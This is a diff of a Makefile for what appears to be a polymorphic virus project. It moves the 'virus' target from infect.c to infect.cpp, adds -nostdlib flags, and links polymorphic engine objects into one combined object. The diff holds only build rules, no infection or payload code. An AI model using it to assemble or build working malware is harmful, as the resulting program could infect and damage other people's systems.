@@ -37,25 +37,29 @@ CC = gcc
 LCC = ld
 AFLAGS = -felf64 -g -F dwarf 
 
-CFLAGS = -c  -Wall -O2 -g
+CFLAGS = -c  -Wall -O2 -g -nostdlib
 
 LFLAGS = -no-pie 
 KFLAGS = -no-pie -nostartfiles -m64 -g -falign-functions=16 
 CKFLAGS = -no-pie -nostartfiles  -m64 -g -falign-functions=16 
 MFLAGS = -no-pie -r
-
+MCFLAGS = -no-pie -r -nostdlib
 all: virus hello  polymorphic.o superpolymorphic.o
 
-# virus: infect.cpp superpolymorphic.o
-# 	$(GCC) $(CKFLAGS) $^ -o $@
+
+virus: infect.cpp superpolymorphic.o
+	$(GCC) $(CKFLAGS) $^ -o $@
+
+superpolymorphic.o: polymorphicengine.o virus.o polymorphicendgame_cpp.o
+	$(GCC) $(MFLAGS) $^ -o $@
 
 
-virus: infect.c superpolymorphic.o
-	$(CC) $(KFLAGS) $^ -o $@	
+# virus: infect.c superpolymorphic.o
+# 	$(CC) $(KFLAGS) $^ -o $@	
 
 
-superpolymorphic.o: polymorphicengine.o virus.o polymorphicendgame.o
-	$(LCC) $(MFLAGS) $^ -o $@
+# superpolymorphic.o: polymorphicengine.o virus.o polymorphicendgame.o
+# 	$(LCC) $(MFLAGS) $^ -o $@
 
 polymorphicendgame_cpp.o: polymorphic.cpp
 	$(GCC) $(CFLAGS) $^ -o $@
